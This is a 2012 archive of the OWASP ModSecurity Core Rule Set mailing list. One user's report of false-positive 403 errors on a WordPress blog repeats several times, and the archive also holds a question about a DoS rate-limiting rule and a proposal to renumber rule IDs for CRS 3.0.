From carlo at carlopoliti.net  Mon Jun  4 23:42:25 2012
From: carlo at carlopoliti.net (Carlo Politi)
Date: Tue, 5 Jun 2012 01:42:25 +0200
Subject: [Owasp-modsecurity-core-rule-set] error 403 with CRS 2.2.4 &
	modsecurity 2.6.5
Message-ID: <1963440128.20120605014225@carlopoliti.net>

Good evening,
i'm trying to make work modsecurity with core rule set 2.2.4 but i have very strange behaviors. If i enable modsecurity, i cannot access my blog (WordPress 3.3.2) and i get a 403 error and my logs are full with these things:

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162] ModSecurity: Unable to retrieve collection (name "global", key "global"). Use SecDataDir to define data directory first. [hostname "blog.carlopoliti.net"] [uri "/custompage/404.css"] [unique_id "T80kSX8AAAEAAGPFKCQAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/custompage/404.css"] [unique_id "T80kSX8AAAEAAGPFKCQAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/custompage/emailCP.png"] [unique_id "T80kSX8AAAEAAGPfLVoAAAAI"]


I have tried to disable these 2 lines and now all works (it seems so) but i'm wondering if there is a way to make it work or i have to disable the line 77 and 169 of file modsecurity_crs_41_sql_injection_attacks.conf?

Thanks


-- 
Carlo Politi
eMail: carlo at carlopoliti.net
www: http://www.carlopoliti.net/
blog: http://blog.carlopoliti.net/






From carlo at carlopoliti.net  Mon Jun  4 23:42:25 2012
From: carlo at carlopoliti.net (Carlo Politi)
Date: Tue, 5 Jun 2012 01:42:25 +0200
Subject: [Owasp-modsecurity-core-rule-set] error 403 with CRS 2.2.4 &
	modsecurity 2.6.5
Message-ID: <1963440128.20120605014225@carlopoliti.net>

Good evening,
i'm trying to make work modsecurity with core rule set 2.2.4 but i have very strange behaviors. If i enable modsecurity, i cannot access my blog (WordPress 3.3.2) and i get a 403 error and my logs are full with these things:

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162] ModSecurity: Unable to retrieve collection (name "global", key "global"). Use SecDataDir to define data directory first. [hostname "blog.carlopoliti.net"] [uri "/custompage/404.css"] [unique_id "T80kSX8AAAEAAGPFKCQAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/custompage/404.css"] [unique_id "T80kSX8AAAEAAGPFKCQAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/custompage/emailCP.png"] [unique_id "T80kSX8AAAEAAGPfLVoAAAAI"]


I have tried to disable these 2 lines and now all works (it seems so) but i'm wondering if there is a way to make it work or i have to disable the line 77 and 169 of file modsecurity_crs_41_sql_injection_attacks.conf?

Thanks


-- 
Carlo Politi
eMail: carlo at carlopoliti.net
www: http://www.carlopoliti.net/
blog: http://blog.carlopoliti.net/






From carlo at carlopoliti.net  Mon Jun  4 23:42:25 2012
From: carlo at carlopoliti.net (Carlo Politi)
Date: Tue, 5 Jun 2012 01:42:25 +0200
Subject: [Owasp-modsecurity-core-rule-set] error 403 with CRS 2.2.4 &
	modsecurity 2.6.5
Message-ID: <1963440128.20120605014225@carlopoliti.net>

Good evening,
i'm trying to make work modsecurity with core rule set 2.2.4 but i have very strange behaviors. If i enable modsecurity, i cannot access my blog (WordPress 3.3.2) and i get a 403 error and my logs are full with these things:

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162] ModSecurity: Unable to retrieve collection (name "global", key "global"). Use SecDataDir to define data directory first. [hostname "blog.carlopoliti.net"] [uri "/custompage/404.css"] [unique_id "T80kSX8AAAEAAGPFKCQAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/custompage/404.css"] [unique_id "T80kSX8AAAEAAGPFKCQAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/custompage/emailCP.png"] [unique_id "T80kSX8AAAEAAGPfLVoAAAAI"]


I have tried to disable these 2 lines and now all works (it seems so) but i'm wondering if there is a way to make it work or i have to disable the line 77 and 169 of file modsecurity_crs_41_sql_injection_attacks.conf?

Thanks


-- 
Carlo Politi
eMail: carlo at carlopoliti.net
www: http://www.carlopoliti.net/
blog: http://blog.carlopoliti.net/






From carlo at carlopoliti.net  Mon Jun  4 23:42:25 2012
From: carlo at carlopoliti.net (Carlo Politi)
Date: Tue, 5 Jun 2012 01:42:25 +0200
Subject: [Owasp-modsecurity-core-rule-set] error 403 with CRS 2.2.4 &
	modsecurity 2.6.5
Message-ID: <1963440128.20120605014225@carlopoliti.net>

Good evening,
i'm trying to make work modsecurity with core rule set 2.2.4 but i have very strange behaviors. If i enable modsecurity, i cannot access my blog (WordPress 3.3.2) and i get a 403 error and my logs are full with these things:

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162] ModSecurity: Unable to retrieve collection (name "global", key "global"). Use SecDataDir to define data directory first. [hostname "blog.carlopoliti.net"] [uri "/custompage/404.css"] [unique_id "T80kSX8AAAEAAGPFKCQAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/custompage/404.css"] [unique_id "T80kSX8AAAEAAGPFKCQAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/custompage/emailCP.png"] [unique_id "T80kSX8AAAEAAGPfLVoAAAAI"]


I have tried to disable these 2 lines and now all works (it seems so) but i'm wondering if there is a way to make it work or i have to disable the line 77 and 169 of file modsecurity_crs_41_sql_injection_attacks.conf?

Thanks


-- 
Carlo Politi
eMail: carlo at carlopoliti.net
www: http://www.carlopoliti.net/
blog: http://blog.carlopoliti.net/






From xcmffl at gmail.com  Wed Jun  6 00:58:08 2012
From: xcmffl at gmail.com (leon xu)
Date: Wed, 6 Jun 2012 08:58:08 +0800
Subject: [Owasp-modsecurity-core-rule-set] varible in dos rule exipired
	earlier then expected
Message-ID: <CA+yt8+=XyJ1-urHL+EEp1sbNjR5DoqCDvdoeJzkrjOGZDywKSg@mail.gmail.com>

Hello, everyone

    I use modsecurity 2.6 protect against dos attack for some specific
pages.
This is the  rule. I test it in my box, it works. But when in some
product *environment(large
number of  *concurrent connections in worker MPM)*, it failed.*
*In the early time I use expiredvar:dos_block every 1800 seconds, as the
modsecurity docs suggests. I found the var "dos_block" expired within 1-10
second(**I dump the resource db),n**ot 1800. So I changed it with
*deprecatevar. But
it does not works too.
Does it because of the concurrent problem?

Thanks.


----------------------------------------------------------------

SecRule REQUEST_URI "^/login.php" \

"phase:1,capture,t:lowercase,t:urlDecodeUni,pass,nolog,setvar:tx.dos_uri=%{TX.1},skip:1"
SecAction "phase:1,pass,nolog,skipAfter:Dos_Marker"





SecAction "phase:1,pass,nolog,t:none,setvar:tx.real_ip=%{REMOTE_ADDR}"
SecAction "phase:1,nolog,initcol:resource='%{tx.real_ip}/'"



SecRule RESOURCE:SHOULD_LOG "@eq 1"
"phase:1,pass,nolog,setvar:resource.should_log=0,skip:2"

#already blocked, nolog here
SecRule RESOURCE:DOS_BLOCKED "@eq 1" \

"phase:1,deny,nolog,severity:'2',status:403,deprecatevar:resource.dos_blocked=1/1800,skipAfter:Dos_Marker"

SecAction "phase:1,pass,nolog,skip:1"

#log version, logdata is real client ip
SecRule RESOURCE:DOS_BLOCKED "@eq 1" \

 "phase:1,deny,log,auditlog,severity:'2',msg:'99010',id:'99010001',tag:'9901',status:403,deprecatevar:resource.dos_blocked=1/1800,logdata:%{tx.real_ip},skipAfter:Dos_Marker"

#counter++
SecAction
"phase:1,nolog,setvar:resource.dos_request_counter=+1,deprecatevar:resource.dos_request_counter=10/60"


# if counter == max then block
SecRule RESOURCE:DOS_REQUEST_COUNTER "@ge 10" \

"phase:5,nolog,setvar:resource.dos_request_counter=0,setvar:resource.dos_blocked=1,setvar:resource.should_log=1"

SecMarker Dos_Marker
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/1dbe15ad/attachment.html>

From carlo at carlopoliti.net  Mon Jun  4 23:42:25 2012
From: carlo at carlopoliti.net (Carlo Politi)
Date: Tue, 5 Jun 2012 01:42:25 +0200
Subject: [Owasp-modsecurity-core-rule-set] error 403 with CRS 2.2.4 &
	modsecurity 2.6.5
Message-ID: <1963440128.20120605014225@carlopoliti.net>

Good evening,
i'm trying to make work modsecurity with core rule set 2.2.4 but i have very strange behaviors. If i enable modsecurity, i cannot access my blog (WordPress 3.3.2) and i get a 403 error and my logs are full with these things:

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162] ModSecurity: Rule b5fcf270 [id "950901"][file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"][line "77"] - Execution error - PCRE limits exceeded (-8): (null). [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:32 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/wp-admin/admin.php"] [unique_id "T80kSH8AAAEAAGPFKCMAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162] ModSecurity: Unable to retrieve collection (name "global", key "global"). Use SecDataDir to define data directory first. [hostname "blog.carlopoliti.net"] [uri "/custompage/404.css"] [unique_id "T80kSX8AAAEAAGPFKCQAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/custompage/404.css"] [unique_id "T80kSX8AAAEAAGPFKCQAAAAH"]

[Mon Jun 04 21:10:33 2012] [error] [client 93.148.109.162]
ModSecurity: Access denied with code 403 (phase 2). Pattern match "([\\\\~\\\\!\\\\@\\\\#\\\\$\\\\%\\\\^\\\\&\\\\*\\\\(\\\\)\\\\-\\\\+\\\\=\\\\{\\\\}\\\\[\\\\]\\\\|\\\\:\\\\;\\"\\\\'\\\\\\xc2\\xb4\\\\\\xe2\\x80\\x99\\\\\\xe2\\x80\\x98\\\\`\\\\<\\\\>].*){8,}" at REQUEST_COOKIES:wp-settings-1. [file "/usr/share/modsecurity-crs_2.2.4/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "169"] [id "981172"] [rev "2.2.4"] [msg "Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded"] [data "=o"] [hostname "blog.carlopoliti.net"] [uri "/custompage/emailCP.png"] [unique_id "T80kSX8AAAEAAGPfLVoAAAAI"]


I have tried to disable these 2 lines and now all works (it seems so) but i'm wondering if there is a way to make it work or i have to disable the line 77 and 169 of file modsecurity_crs_41_sql_injection_attacks.conf?

Thanks


-- 
Carlo Politi
eMail: carlo at carlopoliti.net
www: http://www.carlopoliti.net/
blog: http://blog.carlopoliti.net/


From RBarnett at trustwave.com  Wed Jun  6 14:23:58 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 09:23:58 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]
	Updating Rule IDs
Message-ID: <CBF4E03D.504B3%rbarnett@trustwave.com>

One of the items we are considering with the CRS v3.0 update is to start from scratch with all of the rule IDs.  We have a defined range reserved for the OWASP CRS -
https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#id

900,000?999,999: reserved for the OWASP ModSecurity Core Rule Set [12]<http://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project> project

The rationale for this change is to make it easier to users to do exceptions and disable groups of rules by using SecRuleRemoveById, etc? That directive has the capability to remove ranges of rule IDs, however over the years the rule IDs were added ad-hoc and they are not properly grouped in this manner.  For instance, groupings could be something similar to this -


 *   Protocol Violation ? 900000-900099
 *   Protocol Policies - 900100?900199
 *   Cross-site Scripting - 900200?900299
 *   ?

We would give each rule group approx 100 rule IDs.  The initial number would be less than that which would allow some growth.  After some analysis of the current rules, we really shouldn't ever exceed those allotments as there ends up being rule logic duplication and you just end up with bloated rule amounts.

Keep in mind that the active rule IDs were going to change a bit anyways with this update as we will be consolidating many rules into highly optimized regexes, etc..

The only concern that I have with making this move would be if users have extensively implemented exceptions based on the current rule IDs.  They would need to be aware of this when they migrate to v3.0.

Comments?

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/bb9e4982/attachment.html>

From RBarnett at trustwave.com  Wed Jun  6 15:40:21 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 10:40:21 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread]Updating Rule IDs
